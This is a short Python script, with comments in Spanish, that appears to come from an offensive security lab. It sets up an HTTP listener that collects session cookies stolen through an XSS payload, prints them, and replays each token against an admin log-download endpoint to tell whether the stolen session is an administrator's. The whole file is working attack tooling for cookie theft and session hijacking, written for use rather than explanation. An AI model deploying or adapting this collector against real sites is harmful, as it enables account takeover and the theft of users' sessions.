#!/usr/bin/env python3
"""Servidor minimo para capturar cookies robadas por XSS (Paso 1 del kill chain)."""

from http.server import BaseHTTPRequestHandler, HTTPServer
from http.cookies import SimpleCookie
from urllib.parse import parse_qs, urlparse

import requests


def session_token(cookie_value: str) -> str:
    cookies = SimpleCookie()
    cookies.load(cookie_value)
    if "session" in cookies:
        return cookies["session"].value
    return cookie_value


class CookieLogHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        if parsed.path != "/log":
            self.send_response(404)
            self.end_headers()
            return
        params = parse_qs(parsed.query)
        cookie = params.get("cookie", [""])[0]
        print("\n--- Cookie recibida ---")
        print(cookie)
        print("-----------------------\n")
        token = session_token(cookie)
        try:
            response = requests.get(
                "http://127.0.0.1:8000/admin/logs/download",
                params={"file": "var/www/app/logs/activity.log"},
                cookies={"session": token},
                timeout=5,
            )
            print(response)
            if response.status_code == 200:
                print("Cookie Admin")
            else:
                print("Cookie Usuario")
        except requests.RequestException as exc:
            print(f"No se pudo validar la cookie: {exc}")
        self.send_response(204)
        self.end_headers()

    def log_message(self, format: str, *args) -> None:
        return


def main() -> None:
    host = "127.0.0.1"
    port = 9010
    server = HTTPServer((host, port), CookieLogHandler)
    print(f"Escuchando en http://{host}:{port}/log?cookie=...")
    server.serve_forever()


if __name__ == "__main__":
    main()
